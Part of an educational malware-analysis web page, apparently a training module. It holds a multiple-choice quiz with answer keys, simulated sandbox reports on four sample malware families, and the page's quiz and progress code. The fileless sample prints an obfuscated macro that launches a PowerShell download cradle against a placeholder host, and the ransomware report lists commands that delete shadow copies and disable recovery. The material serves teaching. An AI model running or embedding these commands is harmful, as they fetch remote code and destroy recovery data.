        question: "Which malware component is responsible for hiding the presence of other malware on a system?",
        options: [
          "Dropper",
          "Crypter",
          "Rootkit",
          "Downloader"
        ],
        correct: 2
      },
      {
        question: "What characterizes fileless malware?",
        options: [
          "It deletes all files on the system",
          "It operates in memory without traditional executable files",
          "It only targets file servers",
          "It cannot be detected by any security tools"
        ],
        correct: 1
      },
      {
        question: "Which of the following is NOT a characteristic of APT (Advanced Persistent Threat)?",
        options: [
          "Long-term network presence",
          "Sophisticated techniques and custom malware",
          "Random targeting of any available systems",
          "Specific objectives like espionage or IP theft"
        ],
        correct: 2
      },
      {
        question: "What is the primary purpose of a crypter in malware operations?",
        options: [
          "To encrypt victim files for ransom",
          "To establish encrypted C2 communications",
          "To encrypt malware payload to evade signature detection",
          "To crack passwords on target systems"
        ],
        correct: 2
      },
      {
        question: "Which analysis method examines malware without executing it?",
        options: [
          "Dynamic analysis",
          "Behavioral analysis",
          "Static analysis",
          "Sandbox analysis"
        ],
        correct: 2
      },
      {
        question: "What is a Domain Generation Algorithm (DGA) used for in malware?",
        options: [
          "Encrypting stolen data",
          "Generating random passwords",
          "Creating numerous C2 domain names to evade blocklisting",
          "Spreading through network domains"
        ],
        correct: 2
      },
      {
        question: "Which PowerShell technique is commonly used for fileless malware attacks?",
        options: [
          "Get-Process",
          "IEX (Invoke-Expression) with download cradles",
          "Set-Location",
          "Write-Output"
        ],
        correct: 1
      },
      {
        question: "What does 'Living-off-the-Land' (LotL) mean in malware context?",
        options: [
          "Malware that targets agricultural systems",
          "Using legitimate system tools and binaries for malicious purposes",
          "Malware that operates offline without Internet",
          "Attacks targeting ground-based infrastructure"
        ],
        correct: 1
      },
      {
        question: "Which malware was the first known cyber weapon designed to cause physical damage?",
        options: [
          "WannaCry",
          "Zeus",
          "Stuxnet",
          "Conficker"
        ],
        correct: 2
      },
      {
        question: "What is the primary difference between ransomware and a wiper?",
        options: [
          "Ransomware can be decrypted, wipers permanently destroy data",
          "Wipers demand payment, ransomware doesn't",
          "Ransomware spreads faster than wipers",
          "There is no difference, they're the same thing"
        ],
        correct: 0
      },
      {
        question: "Which IOC (Indicator of Compromise) type is most resistant to attacker modification?",
        options: [
          "IP addresses",
          "Domain names",
          "File hashes",
          "URLs"
        ],
        correct: 2
      },
      {
        question: "What is the purpose of process injection in malware?",
        options: [
          "To speed up malware execution",
          "To hide malicious code in legitimate processes",
          "To inject vulnerabilities into running processes",
          "To permanently modify system processes"
        ],
        correct: 1
      },
      {
        question: "Which technique makes reverse engineering most difficult?",
        options: [
          "String encryption",
          "Code virtualization",
          "Dead code insertion",
          "Simple obfuscation"
        ],
        correct: 1
      },
      {
        question: "What is double extortion ransomware?",
        options: [
          "Demanding payment twice from the same victim",
          "Encrypting files AND threatening to publish stolen data",
          "Targeting both personal and business systems",
          "Using two different encryption algorithms"
        ],
        correct: 1
      }
    ];

    // Malware Analysis Samples
    const analysisData = {
      banker: {
        static: [
          "[*] Initializing static analysis...",
          "[*] File: banking_trojan.exe",
          "[*] MD5: 3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d",
          "[*] SHA256: 9f8e7d6c5b4a3928374...truncated",
          "[*] File Type: PE32 Executable (GUI) Intel 80386",
          "[*] Size: 245,760 bytes",
          "[*] Compilation Timestamp: 2024-03-15 14:32:18",
          "",
          "[+] String Analysis:",
          "    - https://update-security[.]com/api/collect",
          "    - SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
          "    - %AppData%\\SecurityUpdate\\winupdate.exe",
          "    - InternetReadFile",
          "    - CreateMutexA: Global\\BankingTrojan2024",
          "",
          "[+] Import Analysis:",
          "    - ws2_32.dll (Network operations)",
          "    - wininet.dll (HTTP communications)",
          "    - user32.dll (Keylogging capabilities)",
          "    - advapi32.dll (Registry modifications)",
          "",
          "[!] Suspicious Indicators:",
          "    - Packed with UPX packer (entropy: 7.8)",
          "    - Anti-debugging checks detected",
          "    - Banking-related strings found",
          "    - Keylogger API imports present",
          "",
          "[!] VERDICT: Banking Trojan with keylogging and form-grabbing capabilities"
        ],
        dynamic: [
          "[*] Initializing dynamic analysis sandbox...",
          "[*] Creating snapshot: baseline_state",
          "[*] Executing sample: banking_trojan.exe",
          "",
          "[+] Process Activity:",
          "    - PID 4523: banking_trojan.exe spawned",
          "    - PID 4689: svchost.exe (injected code detected)",
          "",
          "[+] File System Activity:",
          "    - WRITE: C:\\Users\\Lab\\AppData\\Roaming\\SecurityUpdate\\winupdate.exe",
          "    - WRITE: C:\\Users\\Lab\\AppData\\Local\\Temp\\keylog.dat",
          "    - DELETE: banking_trojan.exe (self-deletion)",
          "",
          "[+] Registry Modifications:",
          "    - CREATE: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate",
          "    - VALUE: C:\\Users\\Lab\\AppData\\Roaming\\SecurityUpdate\\winupdate.exe",
          "",
          "[+] Network Activity:",
          "    - DNS Query: update-security[.]com -> 185.142.53.78",
          "    - HTTPS POST: https://185.142.53.78/api/collect",
          "    - Payload: 2.3 KB (suspected credential data)",
          "    - C2 Beaconing: Every 120 seconds",
          "",
          "[+] API Calls Monitored:",
          "    - SetWindowsHookExA (Keyboard hook installed)",
          "    - GetForegroundWindow (Window title capture)",
          "    - HttpSendRequest (Data exfiltration)",
          "",
          "[!] Behavioral Analysis:",
          "    - Establishes persistence via registry Run key",
          "    - Installs global keyboard hook (keylogger)",
          "    - Exfiltrates data to C2 server over HTTPS",
          "    - Process injection into svchost.exe for stealth",
          "",
          "[!] THREAT LEVEL: HIGH - Active banking trojan with data theft capabilities"
        ]
      },
      ransomware: {
        static: [
          "[*] Initializing static analysis...",
          "[*] File: crypto_locker.exe",
          "[*] MD5: 7f8e9a0b1c2d3e4f5a6b7c8d9e0f1a2b",
          "[*] SHA256: 1a2b3c4d5e6f7a8b9c0d...truncated",
          "[*] File Type: PE32 Executable (Console) Intel 80386",
          "[*] Size: 512,000 bytes",
          "[*] Signed: Invalid signature (self-signed)",
          "",
          "[+] String Analysis:",
          "    - YOUR FILES HAVE BEEN ENCRYPTED",
          "    - Send 0.5 BTC to: 1A2b3C4d5E6f7G8h9I0j",
          "    - AES-256-CBC encryption initialized",
          "    - .encrypted file extension",
          "    - \\\\Desktop\\RECOVER_FILES.txt",
          "",
          "[+] Cryptographic Indicators:",
          "    - CryptAcquireContext",
          "    - CryptGenKey",
          "    - CryptEncrypt",
          "    - RSA public key embedded (2048-bit)",
          "",
          "[+] Targeted Extensions:",
          "    - .doc, .docx, .xls, .xlsx, .pdf",
          "    - .jpg, .png, .mp4, .avi",
          "    - .sql, .db, .backup",
          "",
          "[!] Suspicious Indicators:",
          "    - High entropy code sections (7.9)",
          "    - Multiple encryption API imports",
          "    - Bitcoin wallet address strings",
          "    - Volume Shadow Copy deletion commands",
          "",
          "[!] VERDICT: Ransomware - File encryption with Bitcoin ransom demand"
        ],
        dynamic: [
          "[*] Initializing dynamic analysis sandbox...",
          "[*] WARNING: Ransomware detected - Enhanced monitoring enabled",
          "[*] Executing sample: crypto_locker.exe",
          "",
          "[+] Process Activity:",
          "    - PID 5234: crypto_locker.exe",
          "    - PID 5445: vssadmin.exe Delete Shadows /All /Quiet",
          "    - PID 5556: cmd.exe bcdedit /set {default} recoveryenabled No",
          "",
          "[+] File System Activity:",
          "    - SCAN: Enumerating all drives (C:, D:, Network shares)",
          "    - ENCRYPT: C:\\Users\\Lab\\Documents\\report.docx -> report.docx.encrypted",
          "    - ENCRYPT: C:\\Users\\Lab\\Pictures\\vacation.jpg -> vacation.jpg.encrypted",
          "    - ENCRYPT: Total 247 files encrypted in 12 seconds",
          "    - WRITE: C:\\Users\\Lab\\Desktop\\RECOVER_FILES.txt (ransom note)",
          "",
          "[+] Registry Modifications:",
          "    - CREATE: HKCU\\Software\\CryptoLocker\\InstallDate",
          "    - CREATE: HKCU\\Software\\CryptoLocker\\EncryptionID",
          "",
          "[+] Network Activity:",
          "    - DNS Query: payment-gateway-crypto[.]onion (Tor network)",
          "    - HTTP POST: Victim ID and encryption key uploaded",
          "    - No C2 beaconing (one-time key exchange)",
          "",
          "[+] Encryption Analysis:",
          "    - Algorithm: AES-256 in CBC mode",
          "    - Key encryption: RSA-2048 public key",
          "    - Files overwritten (secure delete)",
          "",
          "[!] Destructive Actions:",
          "    - Volume Shadow Copies deleted (prevents recovery)",
          "    - Windows Recovery disabled",
          "    - Event logs cleared",
          "",
          "[!] THREAT LEVEL: CRITICAL - Active ransomware with file destruction"
        ]
      },
      fileless: {
        static: [
          "[*] Initializing static analysis...",
          "[*] Sample: malicious_macro.docm",
          "[*] File Type: Office Open XML Document with Macros",
          "[*] Size: 45,823 bytes",
          "",
          "[+] Macro Analysis:",
          "    - VBA Macro: AutoOpen() detected (auto-execution)",
          "    - Macro: Document_Open()",
          "",
          "[+] Obfuscated VBA Code:",
          "    Sub AutoOpen()",
          "    Dim x As String",
          "    x = \"powershell.exe -NoP -sta -NonI -W Hidden -Enc \"",
          "    x = x & \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALQBzAGkAdABlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA==\"",
          "    CreateObject(\"WScript.Shell\").Run x, 0",
          "    End Sub",
          "",
          "[+] Decoded PowerShell Command:",
          "    IEX (New-Object Net.WebClient).DownloadString('http://malicious-site[.]com/payload.ps1')",
          "",
          "[!] Attack Chain:",
          "    1. User opens malicious Word document",
          "    2. Macro auto-executes on document open",
          "    3. PowerShell launched with hidden window",
          "    4. Downloads and executes stage-2 payload from remote server",
          "    5. Entirely memory-resident (fileless)",
          "",
          "[!] VERDICT: Fileless malware using macro + PowerShell download cradle"
        ],
        dynamic: [
          "[*] Initializing dynamic analysis sandbox...",
          "[*] Opening document: malicious_macro.docm",
          "[*] Macro execution allowed for analysis",
          "",
          "[+] Process Activity:",
          "    - PID 3421: WINWORD.EXE",
          "    - PID 3654: powershell.exe -NoP -sta -NonI -W Hidden -Enc [base64]",
          "    - Parent: WINWORD.EXE -> Child: powershell.exe",
          "",
          "[+] Network Activity:",
          "    - DNS Query: malicious-site[.]com -> 194.76.22.91",
          "    - HTTP GET: http://194.76.22.91/payload.ps1",
          "    - Downloaded: 15.2 KB PowerShell script",
          "",
          "[+] Memory Analysis:",
          "    - PowerShell process memory dump captured",
          "    - Reflective PE injection detected",
          "    - Payload: Cobalt Strike Beacon identified",
          "",
          "[+] PowerShell Script Analysis:",
          "    - AMSI bypass technique detected",
          "    - Reflective DLL injection code present",
          "    - C2 server: 194.76.22.91:8443",
          "    - Persistence: WMI event subscription",
          "",
          "[+] WMI Persistence:",
          "    - Event Filter: SystemBootEventFilter",
          "    - Consumer: PowerShell script execution on boot",
          "    - No file dropped - entirely in WMI repository",
          "",
          "[+] File System Activity:",
          "    - ZERO files written to disk",
          "    - All operations in memory/registry/WMI",
          "",
          "[!] Living-off-the-Land Techniques:",
          "    - PowerShell.exe (legitimate Microsoft binary)",
          "    - WMI (Windows Management Instrumentation)",
          "    - No custom executables required",
          "",
          "[!] Detection Challenges:",
          "    - No file-based IOCs",
          "    - Signature-based AV bypassed",
          "    - Requires behavioral detection",
          "",
          "[!] THREAT LEVEL: CRITICAL - Advanced fileless attack with WMI persistence"
        ]
      },
      rat: {
        static: [
          "[*] Initializing static analysis...",
          "[*] File: remote_admin.exe",
          "[*] MD5: 9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b",
          "[*] SHA256: a1b2c3d4e5f6a7b8c9d0...truncated",
          "[*] File Type: PE32 Executable (GUI) Intel 80386",
          "[*] Size: 387,072 bytes",
          "[*] Packer: Themida (strong anti-analysis)",
          "",
          "[+] String Analysis (Limited due to packing):",
          "    - DarkComet RAT v5.3",
          "    - MUTEX: DC_MUTEX-2F8A9B",
          "    - keylog.dat",
          "    - screenshot_%timestamp%.jpg",
          "",
          "[+] Capability Indicators:",
          "    - Remote Desktop Protocol imports",
          "    - Webcam capture libraries (avicap32.dll)",
          "    - Keylogger APIs (GetAsyncKeyState)",
          "    - File transfer functions (FTP/HTTP)",
          "",
          "[+] Network Indicators:",
          "    - Hardcoded C2: 203.0.113.45:1604",
          "    - Fallback C2: ratcontrol.duckdns[.]org:1604",
          "    - Custom binary protocol (non-HTTP)",
          "",
          "[!] Anti-Analysis Features:",
          "    - Themida packer with VM detection",
          "    - Anti-debugging checks",
          "    - Code virtualization",
          "    - Import address table obfuscation",
          "",
          "[!] VERDICT: Remote Access Trojan (RAT) with comprehensive surveillance features"
        ],
        dynamic: [
          "[*] Initializing dynamic analysis sandbox...",
          "[*] Disabling VM detection countermeasures...",
          "[*] Executing sample: remote_admin.exe",
          "",
          "[+] Process Activity:",
          "    - PID 6234: remote_admin.exe",
          "    - Process injection into explorer.exe detected",
          "    - Hidden window created (no GUI visible)",
          "",
          "[+] File System Activity:",
          "    - WRITE: %AppData%\\Windows\\system32.exe (copy of RAT)",
          "    - WRITE: %AppData%\\Windows\\keylog.dat",
          "    - WRITE: %Temp%\\screenshot_20241215_143022.jpg",
          "",
          "[+] Registry Modifications:",
          "    - CREATE: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\System32",
          "    - VALUE: %AppData%\\Windows\\system32.exe -stealth",
          "",
          "[+] Network Activity:",
          "    - TCP Connect: 203.0.113.45:1604 (C2 Server)",
          "    - Connection Status: ESTABLISHED",
          "    - Beaconing: Every 30 seconds",
          "    - Encrypted binary protocol (AES-128)",
          "",
          "[+] Surveillance Capabilities Activated:",
          "    - Keyboard hook installed (global keylogger)",
          "    - Screen capture: Every 60 seconds",
          "    - Webcam enumeration (no capture in sandbox)",
          "    - Clipboard monitoring active",
          "",
          "[+] Remote Commands Received (simulated):",
          "    - CMD: SYSINFO -> Sent system information",
          "    - CMD: SCREENSHOT -> Captured and uploaded",
          "    - CMD: KEYLOG_DOWNLOAD -> Uploaded keylog.dat",
          "    - CMD: FILE_BROWSE -> C:\\ directory listing sent",
          "",
          "[+] Process Injection Analysis:",
          "    - Technique: Process Hollowing",
          "    - Target: explorer.exe",
          "    - Injected code size: 145 KB",
          "    - Purpose: Stealth and persistence",
          "",
          "[!] RAT Features Identified:",
          "    - Remote desktop viewing/control",
          "    - Keylogging and screen capture",
          "    - File upload/download",
          "    - Webcam and microphone access",
          "    - Process and service management",
          "    - Registry editor",
          "",
          "[!] THREAT LEVEL: CRITICAL - Full remote control RAT with comprehensive spying capabilities"
        ]
      }
    };

    // Tab Management
    document.querySelectorAll('.tab').forEach(tab => {
      tab.addEventListener('click', function() {
        const tabName = this.dataset.tab;
        switchTab(tabName);
      });
    });

    function switchTab(tabName) {
      // Update tab buttons
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      document.querySelector(`.tab[data-tab="${tabName}"]`).classList.add('active');

      // Update content
      document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
      document.getElementById(tabName).classList.add('active');

      // Track visited tabs
      state.visitedTabs.add(tabName);
      state.currentTab = tabName;
      updateProgress();

      // Initialize quiz if navigating to quiz tab
      if (tabName === 'quiz' && !state.quizSubmitted) {
        renderQuiz();
      }
    }

    // Progress Tracking
    function updateProgress() {
      const totalTabs = 10;
      const visitedCount = state.visitedTabs.size;
      const percentage = Math.round((visitedCount / totalTabs) * 100);

      document.getElementById('progress-fill').style.width = percentage + '%';
      document.getElementById('progress-percent').textContent = percentage + '%';
      document.getElementById('progress-text').textContent = percentage + '% Complete';
    }

    // Malware Analysis Simulator
    let selectedSample = null;

    document.querySelectorAll('.sample-btn').forEach(btn => {
      btn.addEventListener('click', function() {
        document.querySelectorAll('.sample-btn').forEach(b => b.classList.remove('selected'));
        this.classList.add('selected');
        selectedSample = this.dataset.sample;
      });
    });

    document.getElementById('start-static').addEventListener('click', function() {
      if (!selectedSample) {
        alert('Please select a malware sample first!');
        return;
      }
      runAnalysis('static');
    });

    document.getElementById('start-dynamic').addEventListener('click', function() {
      if (!selectedSample) {
        alert('Please select a malware sample first!');
        return;
      }
      runAnalysis('dynamic');
    });

    document.getElementById('clear-analysis').addEventListener('click', function() {
      const output = document.getElementById('analysis-output');
      output.innerHTML = `
        <div style="color: #00ff00;">‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó</div>
        <div style="color: #00ff00;">‚ïë   HEXWORTH PRIME MALWARE ANALYSIS LABORATORY v3.2    ‚ïë</div>
        <div style="color: #00ff00;">‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù</div>
        <div style="margin-top: 15px; color: #ffff00;">Select a sample and analysis type to begin...</div>
      `;
    });

    function runAnalysis(type) {
      const output = document.getElementById('analysis-output');
      const data = analysisData[selectedSample][type];

      output.innerHTML = '';

      let lineIndex = 0;
      const interval = setInterval(() => {
        if (lineIndex >= data.length) {
          clearInterval(interval);
          return;
        }

        const line = document.createElement('div');
        line.className = 'analysis-line';
        line.textContent = data[lineIndex];

        // Color coding
        if (data[lineIndex].startsWith('[+]')) {
          line.style.color = '#00ff00';
        } else if (data[lineIndex].startsWith('[!]')) {
          line.style.color = '#ff0000';
        } else if (data[lineIndex].startsWith('[*]')) {
          line.style.color = '#00ffff';
        } else if (data[lineIndex].includes('CRITICAL') || data[lineIndex].includes('HIGH')) {
          line.style.color = '#ff0000';
        } else {
          line.style.color = '#00ff00';
        }

        output.appendChild(line);
        output.scrollTop = output.scrollHeight;
        lineIndex++;
      }, 100);
    }

    // Quiz Functionality
    function renderQuiz() {
      const container = document.getElementById('quiz-container');
      const question = quizQuestions[state.currentQuestion];

      container.innerHTML = `
        <div class="question">
          <h4>Question ${state.currentQuestion + 1} of ${quizQuestions.length}</h4>
          <p>${question.question}</p>
          <div class="options">
            ${question.options.map((opt, idx) => `
              <div class="option" data-index="${idx}">
                ${String.fromCharCode(65 + idx)}. ${opt}
              </div>
            `).join('')}
          </div>
        </div>
      `;

      // Restore previous answer if exists
      if (state.answers[state.currentQuestion] !== undefined) {
        const selectedOption = container.querySelector(`[data-index="${state.answers[state.currentQuestion]}"]`);
        if (selectedOption) {
          selectedOption.classList.add('selected');
        }
      }

      // Add click handlers
      container.querySelectorAll('.option').forEach(opt => {
        opt.addEventListener('click', function() {
          container.querySelectorAll('.option').forEach(o => o.classList.remove('selected'));
          this.classList.add('selected');
          state.answers[state.currentQuestion] = parseInt(this.dataset.index);
        });
      });

      updateQuizNav();
    }

    function updateQuizNav() {
      const prevBtn = document.getElementById('prev-question');
      const nextBtn = document.getElementById('next-question');
      const submitBtn = document.getElementById('submit-quiz');

      prevBtn.disabled = state.currentQuestion === 0;

      if (state.currentQuestion === quizQuestions.length - 1) {
        nextBtn.style.display = 'none';
        submitBtn.style.display = 'block';
      } else {
        nextBtn.style.display = 'block';
        submitBtn.style.display = 'none';
      }
    }

    document.getElementById('prev-question').addEventListener('click', function() {
      if (state.currentQuestion > 0) {
        state.currentQuestion--;
        renderQuiz();
      }
    });

    document.getElementById('next-question').addEventListener('click', function() {
      if (state.currentQuestion < quizQuestions.length - 1) {
        state.currentQuestion++;
        renderQuiz();
      }
    });

    document.getElementById('submit-quiz').addEventListener('click', function() {
      // Check if all questions answered
      if (Object.keys(state.answers).length < quizQuestions.length) {
        alert('Please answer all questions before submitting!');
        return;
      }

      // Calculate score
      let correct = 0;
      quizQuestions.forEach((q, idx) => {
        if (state.answers[idx] === q.correct) {
          correct++;
        }
      });

      const percentage = Math.round((correct / quizQuestions.length) * 100);
      const xpEarned = Math.round((percentage / 100) * 75);

      // Show results
      const resultDiv = document.getElementById('quiz-result');
      resultDiv.innerHTML = `
        <div class="quiz-result">
          <h3>üéì Quiz Complete!</h3>
          <div class="score">${correct} / ${quizQuestions.length}</div>
          <div style="font-size: 1.5em; margin: 20px 0;">
            ${percentage}% Score
          </div>
          <div style="font-size: 1.2em;">
            ${xpEarned} XP Earned
          </div>
          <div style="margin-top: 20px; font-size: 0.95em;">
            ${percentage >= 80 ? 'üèÜ Excellent work! You have mastered malware analysis!' :
              percentage >= 60 ? '‚úÖ Good job! Review the materials to improve further.' :
              'üìö Keep studying! Review the content and try again.'}
          </div>
          <button class="btn btn-primary" style="margin-top: 20px;" onclick="reviewAnswers()">Review Answers</button>
        </div>
      `;
      resultDiv.style.display = 'block';
      document.getElementById('quiz-container').style.display = 'none';
      document.querySelector('.quiz-nav').style.display = 'none';

      state.quizSubmitted = true;

      // Update progress to 100%
      state.visitedTabs = new Set(['overview', 'types', 'zoo', 'analysis', 'apt', 'components', 'evasion', 'timeline', 'ioc', 'quiz']);
      updateProgress();

      // Save to localStorage for persistence
      saveProgress(xpEarned, percentage);
    });

    function reviewAnswers() {
      const container = document.getElementById('quiz-container');
      container.innerHTML = '';

      quizQuestions.forEach((q, idx) => {
        const userAnswer = state.answers[idx];
        const isCorrect = userAnswer === q.correct;

        const questionDiv = document.createElement('div');
        questionDiv.className = 'question';
        questionDiv.innerHTML = `
          <h4>Question ${idx + 1}: ${isCorrect ? '‚úÖ Correct' : '‚ùå Incorrect'}</h4>
          <p>${q.question}</p>
          <div class="options">
            ${q.options.map((opt, optIdx) => {
              let className = 'option';
              if (optIdx === q.correct) className += ' correct';
              else if (optIdx === userAnswer && !isCorrect) className += ' incorrect';
              return `<div class="${className}">${String.fromCharCode(65 + optIdx)}. ${opt}</div>`;
            }).join('')}
          </div>
        `;
        container.appendChild(questionDiv);
      });

      container.style.display = 'block';
      document.getElementById('quiz-result').style.display = 'none';
    }

    function saveProgress(xp, score) {
      try {
        // Integration with Hexworth Prime progress tracking
        if (typeof ModuleProgress !== 'undefined') {
          ModuleProgress.complete('malware-analysis-lab', xp);
        }
        if (typeof AchievementManager !== 'undefined') {
          if (score === 100) {
            AchievementManager.unlock('malware-master');
          }
        }

        // Local storage backup
        const progress = {
          module: 'malware-analysis-lab',
          completed: true,
          xp: xp,
          score: score,
          timestamp: new Date().toISOString()
        };
        localStorage.setItem('malware-analysis-progress', JSON.stringify(progress));
      } catch (e) {
        console.log('Progress tracking not available:', e);
      }
    }

    // Initialize
    updateProgress();
  </script>
<script src="../../components/FluxCapacitor.js"></script>
</body>
</html>